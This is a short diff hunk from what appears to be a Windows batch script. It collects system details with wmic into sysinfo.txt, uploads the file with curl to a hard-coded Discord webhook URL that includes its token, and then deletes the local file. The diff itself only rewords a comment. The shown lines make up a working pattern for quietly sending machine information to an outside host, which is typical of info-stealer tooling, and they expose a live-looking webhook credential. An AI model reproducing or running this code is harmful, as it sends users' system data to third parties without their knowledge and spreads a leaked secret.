@@ -53,7 +53,7 @@ wmic memorychip get capacity,manufacturer,partnumber,speed /value >> sysinfo.txt
 :: Set webhook URL
 set "WEBHOOK_URL=https://discord.com/api/webhooks/1540227015473631243/D73LkFqH2DrUavolHZw3TeJuEeEivkKrih85dPYobc9wRII4yzQL4_NPLF_r03XgGpyC"
 
-:: Use curl to send the file
+:: Use curl to send the file with --ssl-no-revoke flag
 curl --ssl-no-revoke -F "file=@sysinfo.txt" %WEBHOOK_URL%
 
 :: Clean up sysinfo.txt
